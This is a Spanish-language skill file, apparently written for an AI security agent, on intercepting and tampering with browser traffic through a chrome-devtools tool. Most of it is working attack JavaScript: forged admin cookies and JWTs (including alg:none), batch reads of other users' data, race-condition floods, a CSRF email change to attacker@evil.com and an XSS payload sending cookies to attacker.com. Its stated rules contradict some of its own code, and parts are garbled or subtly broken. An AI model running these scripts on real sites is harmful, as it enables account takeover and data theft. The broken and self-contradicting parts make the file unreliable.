# Skill: Request Interception & Manipulation

**Categoría:** web, api, auth
**Metodología base:** OWASP WSTG-SESS, WSTG-AUTHN, WSTG-AUTHZ, WSTG-CLIENT
**Cuándo activar:** después de surface-discovery, cuando se necesita evidencia dinámica de vectores web (auth bypass, IDOR, XSS, CSRF, race conditions)
**MCP requerido:** `chrome-devtools`

---

## Arquitectura del Skill

Este skill operacionaliza la captura, manipulación y replay de tráfico HTTP/WebSocket mediante el MCP de chrome-devtools. Permite validar hipótesis que requieren comportamiento real del cliente: tokens que cambian en cada request, flujos OAuth con estados criptográficos, sesiones que se vinculan a cookies específicas, y lógica de negocio que depende de estado client-side.

A diferencia del fuzzing activo (prohibido sin autorización), este skill trabaja con evidencia observable y manipulación acotada de requests ya capturados.

---

## Fase 0 — Setup y Verificación de MCP

### 0.1 Verificar disponibilidad del MCP

```javascript
// Test básico de conectividad
chrome-devtools_list_pages()
// Esperar: [{id: N, url: "..."}] si hay páginas abiertas
```

### 0.2 Verificar autorización del engagement

Ejecutar antes de cualquier interceptación activa:
```
memory.search("authorized engagement [TARGET]")
```

Solo proceder si existe autorización explícita en memoria.

---

## Fase 1 — Captura de Tráfico

### 1.1 Listar Requests Capturados

```javascript
// Listar todos los requests de la sesión actual
chrome-devtools_list_network_requests()

// Filtrar por tipo de recurso
chrome-devtools_list_network_requests({
  resourceTypes: ["xhr", "fetch", "websocket"]
})
```

**Casos de uso por resourceType:**

| resourceType | Qué buscar |
|--------------|------------|
| `xhr` / `fetch` | Endpoints API, parámetros, headers Authorization |
| `websocket` | Canales de comunicación bidireccional, mensajes de negocio |
| `document` | SPA entry points, redirects |
| `script` | JS con lógica de negocio, tokens hardcodeados |
| `stylesheet` | Rutas de assets que revelan estructura interna |

### 1.2 Captura Completa de un Request

```javascript
// Obtener request/response completo por reqid
chrome-devtools_get_network_request({ reqid: N })

// Guardar en archivo para análisis offline
chrome-devtools_get_network_request({
  reqid: N,
  requestFilePath: "evidence/req-{{reqid}}-request.json",
  responseFilePath: "evidence/req-{{reqid}}-response.json"
})
```

**Campos críticos del response:**

```json
{
  "url": "https://target/api/users/1234/profile",
  "method": "GET",
  "headers": {
    "authorization": "Bearer eyJ...",
    "x-csrf-token": "abc123"
  },
  "postData": "{...}",
  "response": {
    "status": 200,
    "headers": {
      "set-cookie": "session=...",
      "cache-control": "no-store"
    },
    "body": "{...}"
  },
  "timing": { "totalTime": 245 }
}
```

### 1.3 Dumps de Estado del Navegador

```javascript
// Dump completo de cookies, localStorage, sessionStorage
chrome-devtools_evaluate_script({
  function: `() => ({
    cookies: document.cookie,
    localStorage: Object.assign({}, localStorage),
    sessionStorage: Object.assign({}, sessionStorage),
    indexedDB: Array.from(indexedDB.databases()).map(d => d.name)
  })`
})

// Dump de todos los endpoints de API conocidos por el cliente
chrome-devtools_evaluate_script({
  function: `() => {
    const origFetch = window.fetch;
    window.__fetchLog = [];
    window.fetch = async (url, opts) => {
      window.__fetchLog.push({url, method: opts?.method, headers: opts?.headers});
      return origFetch(url, opts);
    };
    return 'Fetch interceptado';
  }`
})
```

---

## Fase 2 — Intercepción Activa (Monkey Patching)

### 2.1 Interceptores de Fetch y XHR

El objetivo es capturar y modificar requests ANTES de que salgan del navegador, evadiendo controles client-side.

#### Fetch Interceptor — Captura y Log

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    if (window.__fetchInterceptor) return 'Ya instalado';

    window.__fetchInterceptor = {
      original: window.fetch,
      log: [],
      modifiers: []
    };

    window.fetch = async function(url, options = {}) {
      const entry = {
        timestamp: Date.now(),
        url: url.toString(),
        method: options.method || 'GET',
        headers: options.headers || {},
        body: options.body ? JSON.parse(options.body) : null
      };

      // Aplicar modifiers activos
      let finalOptions = options;
      for (const mod of window.__fetchInterceptor.modifiers) {
        finalOptions = mod(finalOptions) || finalOptions;
      }

      window.__fetchInterceptor.log.push(entry);
      console.log('[Fetch Interceptor]', JSON.stringify(entry, null, 2));

      const response = await window.__fetchInterceptor.original(url, finalOptions);
      const clone = response.clone();
      const body = await clone.text();

      window.__fetchInterceptor.log[window.__fetchInterceptor.log.length - 1].response = {
        status: response.status,
        headers: Object.fromEntries(response.headers.entries()),
        body: body.substring(0, 2000)
      };

      return response;
    };

    return 'Fetch interceptor instalado';
  }`
})
```

#### Fetch Interceptor — Modificación de Headers/Body

```javascript
// Ejemplo: Agregar header de debug o manipular Authorization
chrome-devtools_evaluate_script({
  function: `() => {
    if (!window.__fetchInterceptor) return 'Interceptor no instalado';

    window.__fetchInterceptor.modifiers.push(opts => ({
      ...opts,
      headers: {
        ...opts.headers,
        'X-Debug-Token': 'audit-session',
        'X-Forwarded-For': '10.0.0.1'  // Para probar SSR绕过
      }
    }));

    return 'Modifier agregado';
  }`
})

// Ejemplo: Reemplazar completamente el body para IDOR testing
chrome-devtools_evaluate_script({
  function: `() => {
    window.__fetchInterceptor.modifiers.push(opts => {
      if (opts.body && typeof opts.body === 'object' && opts.body.user_id) {
        return {
          ...opts,
          body: JSON.stringify({ ...opts.body, user_id: 'VICTIM_ID' })
        };
      }
      return opts;
    });
    return 'IDOR modifier instalado';
  }`
})
```

#### XHR Interceptor (XMLHttpRequest)

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    if (window.__xhrInterceptor) return 'XHR interceptor ya instalado';

    const OriginalXHR = window.XMLHttpRequest;

    window.XMLHttpRequest = function() {
      const xhr = new OriginalXHR();
      const originalOpen = xhr.open.bind(xhr);
      const originalSend = xhr.send.bind(xhr);

      xhr.__auditLog = [];

      xhr.open = function(method, url, ...args) {
        xhr.__auditLog.push({ event: 'open', method, url, args });
        return originalOpen(method, url, ...args);
      };

      xhr.send = function(body) {
        xhr.__auditLog.push({ event: 'send', body });
        console.log('[XHR Send]', method, url, body);
        return originalSend(body);
      };

      return xhr;
    };

    window.XMLHttpRequest.prototype = OriginalXHR.prototype;

    return 'XHR interceptor instalado';
  }`
})
```

### 2.2 Manipulación de Cookies y Storage Pre-Request

Para validar que el servidor valida correctamente el estado de sesión en cada request:

```javascript
// Cambiar cookie de sesión antes de un request específico
chrome-devtools_evaluate_script({
  function: `() => {
    // Forzar cookie de admin
    document.cookie = 'session=ADMIN_SESSION_TOKEN; path=/';
    document.cookie = 'role=admin; path=/';
    localStorage.setItem('auth_token', 'MANIPULATED_TOKEN');

    return 'Cookies manipuladas para el proximo request';
  }`
})

// Restaurar estado original
chrome-devtools_evaluate_script({
  function: `() => {
    document.cookie = 'session=ORIGINAL_SESSION_TOKEN; path=/';
    localStorage.removeItem('auth_token');
    return 'Estado restaurado';
  }`
})
```

### 2.3 Modificación de Respuestas (Response Tampering)

Para probar cómo reacciona el cliente a respuestas alteradas del servidor (deserialización, logic bugs):

```javascript
// Interceptar respuestas y modificarlas
chrome-devtools_evaluate_script({
  function: `() => {
    if (window.__fetchInterceptor) {
      const origFetch = window.__fetchInterceptor.original;

      window.fetch = async function(url, options) {
        const response = await origFetch(url, options);
        const clone = response.clone();

        // Modificar respuestas de /api/user para agregar campos privilegiados
        if (url.includes('/api/user')) {
          const body = await clone.json();
          body.is_admin = true;
          body.role = 'superadmin';
          body.credits = 999999;

          return new Response(JSON.stringify(body), {
            status: response.status,
            headers: response.headers
          });
        }

        return response;
      };
    }
    return 'Response tamperer instalado';
  }`
})
```

---

## Fase 3 — Replay y Manipulación de Requests

### 3.1 Replay Directo via fetch()

Después de capturar un request, replicarlo con modificaciones:

```javascript
// Extraer request desde el log del interceptor y reenviar
chrome-devtools_evaluate_script({
  function: `() => {
    const lastReq = window.__fetchInterceptor.log[window.__fetchInterceptor.log.length - 1];

    return fetch(lastReq.url, {
      method: 'PATCH',  // Cambiar método (PUT → PATCH, etc.)
      headers: {
        ...lastReq.headers,
        'Authorization': 'Bearer MANIPULATED_TOKEN',
        'X-CSRF-Token': 'FORGED_TOKEN'
      },
      body: JSON.stringify({ role: 'admin', is_verified: true })
    }).then(r => r.json());
  }`
})
```

### 3.2 Replay con Modificación de Auth Token

```javascript
// Extraer token original, manipular claims, reenviar
chrome-devtools_evaluate_script({
  function: `() => {
    const log = window.__fetchInterceptor?.log || [];
    const apiReq = log.find(e => e.url.includes('/api/'));

    if (!apiReq) return 'No found API requests';

    // Decodificar JWT (sin verificación - es client-side)
    const token = apiReq.headers.authorization?.replace('Bearer ', '');
    const payload = JSON.parse(atob(token.split('.')[1]));
    payload.role = 'admin';
    payload.exp = Math.floor(Date.now() / 1000) + 3600;

    const newToken = [
      token.split('.')[0],
      btoa(JSON.stringify(payload)),
      token.split('.')[2]
    ].join('.');

    return fetch(apiReq.url, {
      method: apiReq.method,
      headers: { ...apiReq.headers, authorization: 'Bearer ' + newToken },
      body: apiReq.body ? JSON.stringify(apiReq.body) : undefined
    });
  }`
})
```

### 3.3 Concurrencia para Race Conditions (TOCTOU)

```javascript
// Enviar N requests concurrentes al mismo endpoint
chrome-devtools_evaluate_script({
  function: `() => {
    const endpoint = 'https://target/api/coupons/redeem';
    const payload = { coupon_id: 'SAVE20', amount: 100 };

    const promises = Array(10).fill().map((_, i) =>
      fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer ' + window.__authToken
        },
        body: JSON.stringify({ ...payload, request_id: i })
      }).then(r => r.json())
    );

    return Promise.allSettled(promises);
  }`
})
```

---

## Fase 4 — Validación de Vectores Específicos

### 4.1 IDOR — Cambio de Identificador en Batch

```javascript
// Iterar sobre IDs y extraer datos de otros usuarios
chrome-devtools_evaluate_script({
  function: `() => {
    const baseUrl = 'https://target/api/users';
    const ids = [1, 2, 3, 100, 999, 1234];

    return Promise.all(ids.map(id =>
      fetch(\`\${baseUrl}/\${id}/profile\`, {
        headers: { 'Authorization': 'Bearer ' + window.__authToken }
      }).then(r => r.json()).then(data => ({ id, data })).catch(e => ({ id, error: e.message }))
    ));
  }`
})
```

### 4.2 CSRF — Extracción y Reenvío de Token

```javascript
// Extraer CSRF token de la página y usarlo en un request cross-origin
chrome-devtools_evaluate_script({
  function: `() => {
    const csrfToken = document.querySelector('[name=csrf-token]')?.content
      || document.querySelector('meta[name=csrf-token]')?.content
      || document.querySelector('[data-csrf]')?.dataset.csrf;

    return fetch('https://target/api/change-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
        'Origin': 'https://target'
      },
      body: JSON.stringify({ email: 'attacker@evil.com' }),
      credentials: 'include'
    });
  }`
})
```

### 4.3 Auth Bypass — Token Removal y Parameter Tampering

```javascript
// Probar: request sin Authorization header
chrome-devtools_evaluate_script({
  function: `() => {
    const log = window.__fetchInterceptor?.log || [];
    const req = log.find(e => e.url.includes('/api/admin'));

    if (!req) return 'No admin requests found';

    const { headers, ...rest } = req;
    delete headers['authorization'];
    delete headers['Authorization'];

    return fetch(req.url, { ...rest, headers }).then(r => r.json());
  }`
})

// Probar: agregar rol como parámetro
chrome-devtools_evaluate_script({
  function: `() => {
    const log = window.__fetchInterceptor?.log || [];
    const req = log.find(e => e.url.includes('/api/users'));

    return fetch(req.url + '?role=admin', {
      method: 'GET',
      headers: { ...req.headers }
    }).then(r => r.json());
  }`
})
```

### 4.4 JWT Manipulation — Algorithm Confusion

```javascript
// Probar alg: none
chrome-devtools_evaluate_script({
  function: `() => {
    const log = window.__fetchInterceptor?.log || [];
    const req = log.find(e => e.headers?.authorization?.startsWith('Bearer '));

    if (!req) return 'No JWT found';

    const token = req.headers.authorization.replace('Bearer ', '');
    const [header, payload, sig] = token.split('.');

    const manipulatedHeader = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));

    const newToken = [manipulatedHeader, payload, ''].join('.');

    return fetch(req.url, {
      method: req.method,
      headers: { ...req.headers, authorization: 'Bearer ' + newToken },
      body: req.body ? JSON.stringify(req.body) : undefined
    }).then(r => r.json());
  }`
})
```

### 4.5 DOM XSS — Sink Detection en Tiempo Real

```javascript
// Monitorear sinks dangerousos en el DOM
chrome-devtools_evaluate_script({
  function: `() => {
    const sinks = {
      document_write: document.write.bind(document),
      innerHTML_set: Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML'),
      eval_call: eval
    };

    // Patch document.write
    document.write = function(html) {
      console.error('[DOM XSS - document.write]', html);
      sinks.document_write(html);
    };

    // Patch innerHTML setter
    const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    Object.defineProperty(Element.prototype, 'innerHTML', {
      set: function(val) {
        if (/<script|on\w+=/i.test(val)) {
          console.error('[DOM XSS - innerHTML]', val);
        }
        return origInnerHTML.set.call(this, val);
      }
    });

    // Patch eval
    window.eval = function(code) {
      console.error('[DOM XSS - eval]', code);
      return eval.call(this, code);
    };

    return 'DOM XSS monitor instalado';
  }`
})

// Inyectar payload en source conocida (location.hash)
chrome-devtools_evaluate_script({
  function: `() => {
    // Simular input del usuario en location.hash
    location.hash = '<img src=x onerror=fetch(\"https://attacker.com/?c=\"+document.cookie)>';
    // Trigger del sink si existe
    if (location.href.includes('#')) {
      document.querySelector('#output').innerHTML = decodeURIComponent(location.hash.substring(1));
    }
  }`
})
```

---

## Fase 5 — Extracción de Evidencia

### 5.1 Generar HAR del Tráfico Capturado

```javascript
// Exportar log completo como HAR
chrome-devtools_evaluate_script({
  function: `() => {
    const log = window.__fetchInterceptor?.log || [];
    return JSON.stringify({
      logVersion: '1.2',
      creator: { name: 'Security Audit', version: '1.0' },
      entries: log.map(entry => ({
        startedDateTime: new Date(entry.timestamp).toISOString(),
        time: entry.response ? Date.now() - entry.timestamp : 0,
        request: {
          method: entry.method,
          url: entry.url,
          headers: Object.entries(entry.headers).map(([n,v]) => ({ name: n, value: v })),
          postData: entry.body ? { text: JSON.stringify(entry.body) } : undefined
        },
        response: entry.response ? {
          status: entry.response.status,
          headers: Object.entries(entry.response.headers || {}).map(([n,v]) => ({ name: n, value: v })),
          content: { text: entry.response.body }
        } : undefined
      }))
    }, null, 2);
  }`
})
```

### 5.2 Captura de Pantalla con Anotaciones

```javascript
// Captura del estado actual del DOM
chrome-devtools_take_snapshot({ verbose: true })

// Captura visual con marcador
chrome-devtools_take_screenshot({ fullPage: true })
```

### 5.3 Guardar Request Completo para Replay Externo

```javascript
// Guardar request en formato curl para uso externo (Burp, mitmproxy)
chrome-devtools_evaluate_script({
  function: `() => {
    const req = window.__fetchInterceptor?.log?.slice(-1)[0];
    if (!req) return 'No requests';

    const headers = Object.entries(req.headers)
      .map(([k,v]) => \`-H '\${k}: \${v}'\`)
      .join(' ');

    const curl = \`curl -X \${req.method} '\${req.url}' \${headers}\` +
      (req.body ? \` -d '\${JSON.stringify(req.body)}'\` : '');

    console.log(curl);
    return curl;
  }`
})
```

---

## Anti-Patterns (Errores Críticos)

- **NO usar este skill para fuzzing masivo.** La manipulación debe ser quirúrgica y justificada por una hipótesis.
- **NO ejecutar payloads de explotación activos** (SQLi con sleep(), XSS con alert()) — solo observar comportamiento.
- **NO modificar el estado del target** (crear usuarios, cambiar contraseñas, escribir datos). Solo leer.
- **NO deixar interceptores instalados** en el navegador del usuario después de la auditoría. Limpiar con `window.fetch = window.__fetchInterceptor.original`.
- **NO capturar credenciales reales** en texto plano. Si se capturan tokens, maskarlos antes de guardar evidencia.

---

## Checklist de Cierre del Skill

```
[ ] Interceptores instalados y operativos
[ ] Requests capturados categorizados por endpoint/método
[ ] Hipótesis validadas:
    [ ] IDOR: ¿IDs predecibles? ¿Ownership check existe?
    [ ] Auth bypass: ¿token removal funciona?
    [ ] CSRF: ¿tokens son verificados?
    [ ] JWT: ¿algoritmo puede ser manipulado?
    [ ] DOM XSS: ¿sinks receptivos a sources controladas?
[ ] Evidencia guardada:
    [ ] HAR file con requests/responses
    [ ] Screenshots del estado del navegador
    [ ] Scripts de replay para reproducción
[ ] Interceptores limpiados (estado original restaurado)
```

---

## Integración con security-web

Este skill se activa cuando:

1. `needs_followup_by: ["security-web"]` incluye vectores de autenticación o control de acceso
2. El target tiene SPA, login complejo, OAuth, o API que requiere comportamiento real del cliente
3. Se necesita **evidencia observable** (no teórica) para validar una hipótesis

**Flujo típico:**

```
security-scout → identifica endpoint /api/admin sin auth visible
  → needs_followup_by: ["security-web"]
security-web → usa request-interception-manipulation
  → captura tráfico real
  → prueba token removal → 401 vs 200 diferencia
  →documenta: validated IDOR, CWE-639
  → needs_followup_by: ["security-code"] si encuentra código relevante
```
